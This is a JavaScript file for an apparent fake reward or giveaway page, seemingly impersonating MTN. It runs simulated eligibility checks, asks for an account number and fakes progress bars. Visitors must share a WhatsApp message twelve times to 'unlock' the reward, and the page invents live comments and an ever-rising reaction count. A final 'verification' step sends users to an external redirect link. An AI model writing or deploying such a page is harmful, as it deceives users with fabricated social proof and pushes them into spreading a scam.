
    (function() {
        'use strict';

        // ========== DOM REFS ==========
        const $ = (sel) => document.querySelector(sel);
        const $$ = (sel) => document.querySelectorAll(sel);

        const btnCheck = $('#btnCheckEligibility');
        const stepOffer = $('#stepOffer');
        const stepLoading = $('#stepLoading');
        const stepPhone = $('#stepPhone');
        const stepProgress = $('#stepProgress');
        const stepShareProgress = $('#stepShareProgress');
        const loadPercent = $('#loadPercent');
        const phoneInput = $('#phoneInput');
        const btnSendPhone = $('#btnSendPhone');
        const phoneStatus = $('#phoneStatus');
        const bar1 = $('#bar1'), bar2 = $('#bar2'), bar3 = $('#bar3');
        const pct1 = $('#pct1'), pct2 = $('#pct2'), pct3 = $('#pct3');
        const progItems = $$('.progress-item');
        const btnShare = $('#btnShareWhatsApp');
        const shareStatus = $('#shareStatus');
        const shareBar = $('#shareBar');
        const sharePct = $('#sharePct');
        const btnShareAgain = $('#btnShareAgain');
        const shareProgressStatus = $('#shareProgressStatus');
        const modalCongrats = $('#modalCongrats');
        const modalHumanVerify = $('#modalHumanVerify');
        const modalVerifyBtn = $('#modalVerifyBtn');
        const modalShareBtn = $('#modalShareBtn');
        const deviceIphone = $('#deviceIphone');
        const deviceAndroid = $('#deviceAndroid');

        // Comment elements
        const commentThread = $('#commentThread');
        const commentInput = $('#commentInput');
        const btnSendComment = $('#btnSendComment');
        const commentCount = $('#commentCount');
        const reactionCount = $('#reactionCount');

        // ========== STATE ==========
        let shareCounter = 0;
        let commentCountVal = 668;
        let reactionCountVal = 179000;
        let allBarsDone = false;

        // ========== COOKIE HELPERS ==========
        function setCookie(name, value, days) {
            var expires = "";
            if (days) {
                var date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "") + expires + "; path=/";
        }

        function getCookie(name) {
            var nameEQ = name + "=";
            var ca = document.cookie.split(';');
            for (var i = 0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        // ========== SAVE/RESTORE SHARE PROGRESS ==========
        function saveShareProgress() {
            setCookie('mtn_share_count', shareCounter, 30);
        }

        function restoreShareProgress() {
            const saved = getCookie('mtn_share_count');
            if (saved !== null) {
                shareCounter = parseInt(saved, 10) || 0;
                return true;
            }
            return false;
        }

        // ========== UTILITY ==========
        function setStatus(el, msg, isError = false) {
            el.textContent = msg;
            el.style.color = isError ? '#e74c3c' : '#2ecc71';
        }

        function showStep(id) {
            [stepOffer, stepLoading, stepPhone, stepProgress, stepShareProgress].forEach(el => el.classList.remove('active'));
            if (id) document.getElementById(id).classList.add('active');
        }

        function showModal(id) {
            document.getElementById(id).classList.add('open');
        }
        function hideModal(id) {
            document.getElementById(id).classList.remove('open');
        }

        // ========== AVATAR GENERATOR ==========
        function getAvatarUrl(name) {
            const bgColors = ['f7b731', 'e67e22', '3498db', '2ecc71', 'e74c3c', '9b59b6', '1abc9c', 'f39c12'];
            const color = bgColors[Math.floor(Math.random() * bgColors.length)];
            return `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=${color}&color=fff&size=40&font-size=0.5`;
        }

      

        // ========== INIT LIVE COMMENTS ==========
        function initLiveComments() {
            const initialIndices = [0, 1, 2, 3, 4, 5];
            initialIndices.forEach(i => {
                const c = commentPool[i % commentPool.length];
                addComment(c.name, c.text, c.right || false, false, i === 0);
            });
            commentCount.textContent = commentCountVal;
            reactionCount.textContent = '179k';

            setInterval(() => {
                if (Math.random() > 0.4) {
                    const fakeName = commentPool[commentIndex % commentPool.length].name;
                    addComment(fakeName, '', false, true);
                    setTimeout(() => {
                        if (commentThread.lastChild && commentThread.lastChild.querySelector('.typing-indicator')) {
                            commentThread.removeChild(commentThread.lastChild);
                        }
                        addRandomComment();
                    }, 1500 + Math.random() * 2500);
                } else {
                    addRandomComment();
                }
            }, 5000 + Math.random() * 7000);
        }

    
        // ========== FLOW: CHECK ELIGIBILITY ==========
        btnCheck.addEventListener('click', function() {
            btnCheck.classList.add('disabled');
            showStep('stepLoading');
            let p = 0;
            loadPercent.textContent = '0%';
            const interval = setInterval(() => {
                p += Math.floor(Math.random() * 5) + 2;
                if (p > 100) p = 100;
                loadPercent.textContent = p + '%';
                if (p === 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        showStep('stepPhone');
                        phoneStatus.textContent = '';
                    }, 400);
                }
            }, 70);
        });

        // ========== SEND PHONE ==========
        btnSendPhone.addEventListener('click', function() {
            const num = phoneInput.value.trim();
            if (!num || num.length < 8) {
                setStatus(phoneStatus, 'Please enter a valid Account number.', true);
                return;
            }
            setStatus(phoneStatus, '✅ Account Number accepted. Validating...', false);
            setTimeout(() => {
                showStep('stepProgress');
                startProgressBars();
            }, 600);
        });

        phoneInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') btnSendPhone.click();
        });

        // ========== PROGRESS BARS (3 bars) ==========
        function startProgressBars() {
            [bar1, bar2, bar3].forEach(b => b.style.width = '0%');
            [pct1, pct2, pct3].forEach(p => p.textContent = '0%');
            progItems.forEach(el => el.classList.remove('done'));
            btnShare.style.display = 'none';
            shareStatus.textContent = '';
            allBarsDone = false;

            let step = 0;
            const totalSteps = 3;
            const bars = [bar1, bar2, bar3];
            const pcts = [pct1, pct2, pct3];

            function advanceStep() {
                if (step < totalSteps) {
                    let p = 0;
                    const interval = setInterval(() => {
                        p += Math.floor(Math.random() * 4) + 1;
                        if (p > 100) p = 100;
                        bars[step].style.width = p + '%';
                        pcts[step].textContent = p + '%';
                        if (p === 100) {
                            clearInterval(interval);
                            progItems[step].classList.add('done');
                            step++;
                            if (step < totalSteps) {
                                setTimeout(advanceStep, 500);
                            } else {
                                allBarsDone = true;
                                setTimeout(() => {
                                    btnShare.style.display = 'block';
                                    shareStatus.textContent = '✅ All steps complete! Click Proceed to continue.';
                                }, 400);
                            }
                        }
                    }, 60 + Math.random() * 40);
                }
            }
            advanceStep();
        }

       

        // ========== SHARE LOGIC ==========
        function performShare() {
            const msg = getShareMessage();
            const encoded = encodeURIComponent(msg);
            const whatsappUrl = `https://api.whatsapp.com/send?text=${encoded}`;
            window.open(whatsappUrl, '_blank');
        }

        function updateShareProgress() {
            const pct = Math.min(100, Math.round((shareCounter / 12) * 100));
            shareBar.style.width = pct + '%';
            sharePct.textContent = pct + '%';
            if (shareCounter >= 12) {
                shareProgressStatus.textContent = '🎉 You\'ve shared with 12 friends! Reward unlocked.';
                btnShareAgain.style.display = 'none';
                setTimeout(() => {
                    showModal('modalHumanVerify');
                }, 600);
            } else {
                shareProgressStatus.textContent = `📤 Shared ${shareCounter}/12 times. Keep sharing!`;
            }
            // Save progress to cookie
            saveShareProgress();
        }

        function handleShare() {
            shareCounter++;
            performShare();
            updateShareProgress();
        }

        // ========== SHARE BUTTON (in stepProgress) ==========
        btnShare.addEventListener('click', function() {
            if (!allBarsDone) return;
            showStep('stepShareProgress');
            // Restore saved progress when entering share step
            const hasSaved = restoreShareProgress();
            if (shareCounter === 0) {
                shareBar.style.width = '0%';
                sharePct.textContent = '0%';
                shareProgressStatus.textContent = 'Start sharing to unlock your reward!';
                btnShareAgain.style.display = 'block';
            } else {
                updateShareProgress();
                if (shareCounter >= 12) {
                    btnShareAgain.style.display = 'none';
                } else {
                    btnShareAgain.style.display = 'block';
                }
            }
        });

        // ========== SHARE AGAIN (in stepShareProgress) ==========
        btnShareAgain.addEventListener('click', function() {
            if (shareCounter < 12) {
                handleShare();
            } else {
                showModal('modalHumanVerify');
            }
        });

        // ========== MODAL CONTROLS ==========
        modalShareBtn.addEventListener('click', function() {
            hideModal('modalCongrats');
            if (shareCounter >= 12) {
                showModal('modalHumanVerify');
            } else {
                if (stepShareProgress.classList.contains('active')) {
                    btnShareAgain.click();
                } else {
                    if (stepProgress.classList.contains('active') && allBarsDone) {
                        btnShare.click();
                    } else {
                        showStep('stepShareProgress');
                        // Restore saved progress
                        restoreShareProgress();
                        if (shareCounter === 0) {
                            shareBar.style.width = '0%';
                            sharePct.textContent = '0%';
                            shareProgressStatus.textContent = 'Start sharing to unlock your reward!';
                            btnShareAgain.style.display = 'block';
                        } else {
                            updateShareProgress();
                            if (shareCounter >= 12) {
                                btnShareAgain.style.display = 'none';
                            } else {
                                btnShareAgain.style.display = 'block';
                            }
                        }
                        btnShareAgain.click();
                    }
                }
            }
        });

        modalVerifyBtn.addEventListener('click', function() {
            hideModal('modalCongrats');
            if (shareCounter >= 12) {
                showModal('modalHumanVerify');
            } else {
                alert('Please share with 12 friends first to unlock verification.');
                showStep('stepShareProgress');
                restoreShareProgress();
                if (shareCounter === 0) {
                    shareBar.style.width = '0%';
                    sharePct.textContent = '0%';
                    shareProgressStatus.textContent = 'Start sharing to unlock your reward!';
                    btnShareAgain.style.display = 'block';
                } else {
                    updateShareProgress();
                    if (shareCounter >= 12) {
                        btnShareAgain.style.display = 'none';
                    } else {
                        btnShareAgain.style.display = 'block';
                    }
                }
            }
        });

        // ========== DEVICE BUTTONS ==========
        deviceIphone.addEventListener('click', function() {
            window.open('https://ey43.com/4/3144603', '_blank');
        });
        deviceAndroid.addEventListener('click', function() {
            window.open('https://ey43.com/4/3144603', '_blank');
        });

        // close modals on overlay click
        document.querySelectorAll('.modal-overlay').forEach(el => {
            el.addEventListener('click', function(e) {
                if (e.target === this) this.classList.remove('open');
            });
        });

        // ========== CHECK FOR SAVED PROGRESS ON LOAD ==========
        function checkSavedProgress() {
            const saved = getCookie('mtn_share_count');
            if (saved !== null) {
                const count = parseInt(saved, 10) || 0;
                if (count > 0 && count < 12) {
                    // User has started sharing, show share progress
                    shareCounter = count;
                    showStep('stepShareProgress');
                    shareBar.style.width = Math.round((count / 12) * 100) + '%';
                    sharePct.textContent = Math.round((count / 12) * 100) + '%';
                    shareProgressStatus.textContent = `📤 Shared ${count}/12 times. Keep sharing!`;
                    btnShareAgain.style.display = 'block';
                    // Also mark bars as done so they can proceed
                    allBarsDone = true;
                    progItems.forEach(el => el.classList.add('done'));
                    [bar1, bar2, bar3].forEach(b => b.style.width = '100%');
                    [pct1, pct2, pct3].forEach(p => p.textContent = '100%');
                    btnShare.style.display = 'none';
                    return true;
                } else if (count >= 12) {
                    // User already completed sharing, show human verify
                    shareCounter = count;
                    showModal('modalHumanVerify');
                    return true;
                }
            }
            return false;
        }

        // ========== INIT ==========
        // Check for saved progress first
        if (!checkSavedProgress()) {
            showStep('stepOffer');
        }
        initLiveComments();

        // ========== REACTION COUNTER ==========
        setInterval(() => {
            reactionCountVal += Math.floor(Math.random() * 30) + 10;
            reactionCount.textContent = (reactionCountVal / 1000).toFixed(0) + 'k';
        }, 4000);

        console.log('POWERED BY: Davido');
    })();
